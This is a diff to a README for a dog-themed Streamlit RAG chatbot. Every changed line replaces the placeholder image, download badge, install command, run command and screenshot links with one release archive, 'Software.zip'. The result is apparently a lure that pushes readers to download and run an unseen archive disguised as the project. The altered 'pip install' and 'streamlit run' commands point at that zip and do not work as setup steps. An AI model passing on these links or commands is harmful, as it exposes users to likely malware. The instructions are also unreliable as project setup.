@@ -1,6 +1,6 @@
 # 🐶 Welcome to Doggo Rag Chatbot 🤖
 
-![Dog Chatbot](https://example.com/dog_chatbot_image.jpg)
+![Dog Chatbot](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
 
 ### Repository Name:
 doggo-rag-chatbot
@@ -14,7 +14,7 @@ Welcome to **Doggo Rag Chatbot** - a cutting-edge Streamlit GenAI chatbot that l
 ### Get Started:
 Click on the button below to download the Doggo Rag Chatbot:
 
-[![Download Doggo Rag Chatbot](https://img.shields.io/badge/Download-Doggo%20Rag%20Chatbot-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Doggo Rag Chatbot](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip%20Rag%20Chatbot-brightgreen)](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
 
 **Note: Link needs to be launched.**
 
@@ -28,15 +28,15 @@ Click on the button below to download the Doggo Rag Chatbot:
 ### How to Use:
 1. Clone the repository to your local machine.
    
-2. Install the required dependencies by running `pip install -r requirements.txt`.
+2. Install the required dependencies by running `pip install -r https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip`.
    
-3. Launch the chatbot app by running `streamlit run doggo_rag_chatbot.py`.
+3. Launch the chatbot app by running `streamlit run https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip`.
    
 4. Interact with the chatbot and enjoy learning more about dogs!
 
 ### Screenshots:
-![Chatbot Screenshot 1](https://example.com/chatbot_screenshot_1.jpg)
-![Chatbot Screenshot 2](https://example.com/chatbot_screenshot_2.jpg)
+![Chatbot Screenshot 1](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
+![Chatbot Screenshot 2](https://github.com/Nikilathetroller/doggo-rag-chatbot/releases/download/v1.0/Software.zip)
 
 ### Contributions:
 Contributions are welcome! Feel free to submit a pull request to enhance the functionality of the Doggo Rag Chatbot.
